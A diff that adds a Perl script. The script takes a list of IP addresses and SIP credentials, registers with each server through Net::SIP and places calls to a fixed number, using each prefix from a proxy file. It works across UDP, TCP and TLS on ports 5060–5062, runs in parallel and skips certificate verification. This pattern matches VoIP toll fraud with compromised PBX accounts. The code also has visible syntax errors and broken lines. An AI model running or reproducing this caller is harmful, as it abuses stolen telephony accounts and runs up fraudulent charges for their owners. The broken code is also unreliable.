@@ -1,0 +1,114 @@
+use strict;
+use warnings;
+use Data::Dumper;
+use IO::Socket::INET;
+ Socket;
+use Test::More;
+use Net::SIP;
+use Parallel::ForkManager;
+use Term::ANSIColor;
+use Time::HiRes qw(gettimeofday tv_interval);
+use IO::Socket::SSL;
+
+my $ip_file = $ARGV[0];
+my $num = '184885651';
+my $proxy_file = 'prx';
+my $filename = 'caller.log';
+my $ring_time = '40';
+my $max_processes = $ARGV[1];
+my $timeout = $ARGV[2];
+
+my $default_user = '10001';
+my $default_pass = '12345';
+
+if (@ARGV < 1) {
+    print "[!] $0 <ip_file> <threads> <timeout>\r\n";
+    exit;
+}
+
+my @ips = read_file($ip_file);
+my @proxies = read_file($proxy_file);
+
+my @ports = (5060, 5061, 5062); # قائمة المنافذ المراد استخدامها
+
+my $pm = Parallel::ForkManager->new($max_processes);
+
+foreach my $proxy (@proxies) {
+    foreach my $line (@ips) {
+        my $to = "$proxy$num";
+        my ($ip, $user, $pass) = split(/ /, $line);
+        $ip =~ s/\x0a//g;
+        
+        # جرب البروتوكولات والناف المختلفة
+        for my $protocol ('udp', 'tcp', 'tls') {
+            for my $port (@ports) {
+                my $pid = $pm->start and next;
+                print color("bold red"), "$ip $user $pass $to $protocol $port\n";
+                call($ip, $user, $pass, $to, $protocol, $port);
+                $pm->finish;
+            }
+        }
+    }
+    print color("bold red"), "Switching $proxy$num \n";
+}
+
+$pm->wait_all_children();
+
+sub read_file {
+    my $file = shift;
+    open my $handle, '<', $file or die "Cannot open file: $!";
+    chomp(my @lines = <$handle>);
+    close $handle;
+    return @lines;
+}
+
+sub call {
+    my $ip = shift;
+    my $user = shift;
+    my $pass = shift;
+    my $to = shift;
+    my $protocol = shift;
+    my $port = shift;
+
+    my $ua = Net::SIP::Simple->new(
+        outgoing_proxy => "$protocol:$ip:$port",
+        registrar => $ip,
+        domain => $ip,
+        from => $user,
+        auth => [ $user, $pass ],
+        leg => $protocol eq 'tls' ? { socktype => 'tls', ssl => { SSL_verify_mode => SSL_VERIFY_NONE } } : undef,
+    );
+
+    my $;
+    eval {
+        local $SIG{ALRM} = sub { die "alarm\n" };
+        alarm $timeout;
+        $call = $ua->invite( $to,
+            cb_established => {
+                my $call = shift;
+                print color("bold green"), "Call established to $ip\n";
+                $call->bye;
+                exit;
+            },
+            cb_early => sub {
+                my $call = shift;
+                print color("bold yellow"), "Early response from $ip\n";
+                $call->bye;
+                exit;
+            },
+            cb_noanswer => sub {
+                my $call = shift;
+                print color("bold blue"), "No answer from $ip\n";
+                $call->bye;
+                exit;
+            },
+            ring_time => $ring_time,
+        );
+        alarm 0;
+    };
+    if ($@) {
+        die unless $@ eq "alarm\n";
+        print color("bold magenta"), "Timeout reached for $ip\n";
+    }
+    $call->bye if $call;
+}
